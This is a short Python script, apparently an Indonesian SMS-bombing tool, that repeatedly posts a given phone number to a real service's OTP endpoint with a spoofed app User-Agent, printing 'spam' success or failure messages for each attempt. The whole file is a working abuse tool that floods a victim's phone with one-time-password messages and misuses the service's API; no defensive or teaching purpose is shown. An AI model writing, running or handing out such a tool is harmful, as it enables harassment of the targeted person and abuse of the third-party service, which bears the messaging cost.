import requests,os,sys,json
from time import sleep
from war.war import *

def hut(nom, jml):
	sleep(1)
	print("")
	data = json.dumps({"memberToken":"","receivers":nom})

	for x in range(jml):
		cal = requests.post("https://phr.gms.digital/api/user/getOTP",headers={"Content-Type":"application/json","User-Agent":"okhttp/3.12.1"},data=data)
		if 'ok' in cal.text:
			print(f"{r}[+] {c}Spam ke {k}+62{nom} {c}Gagal!! ")
		else:
			print(f"{k}[+] {c}Spam ke {k}+62{nom} {c}Berhasil ")
			sleep(1.5)
